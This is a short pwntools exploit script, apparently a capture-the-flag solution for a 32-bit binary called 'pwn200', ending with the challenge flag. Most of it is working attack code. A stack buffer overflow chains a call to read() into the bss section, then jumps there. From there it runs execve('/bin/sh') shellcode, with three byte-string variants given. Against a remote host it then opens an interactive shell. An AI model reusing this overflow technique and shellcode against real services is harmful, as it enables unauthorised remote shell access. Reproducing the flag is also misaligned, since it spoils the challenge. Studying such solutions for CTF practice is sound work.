from pwn import *

#shell="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"   #vampire
shell="\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"    #585.php
#shell="\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"                   #575.php
elf=ELF('pwn200')
#r=process('./pwn200')
r=remote("54.67.102.66","5254")
exploit="A"*24+"B"*4                        #offset to ebp is 0x18=24, $ebp=0x42424242
exploit+=p32(elf.symbols['read'])           #call read as : read(0,&shell,25), &shell= start of bss section
exploit+=p32(elf.symbols['__bss_start'])    #return to &shell
exploit+=p32(0)                             #parameter to read
exploit+=p32(elf.symbols['__bss_start'])    #parameter to read
exploit+=p32(25)                            #parameter to read

r.recv()
r.send(exploit)
r.send(shell)
r.interactive()
#r.sendline("cat /home/pwn200/flag")

#Bugs_Bunny{Its_all_about_where_We_Can_Put_Our_Shell:D!}

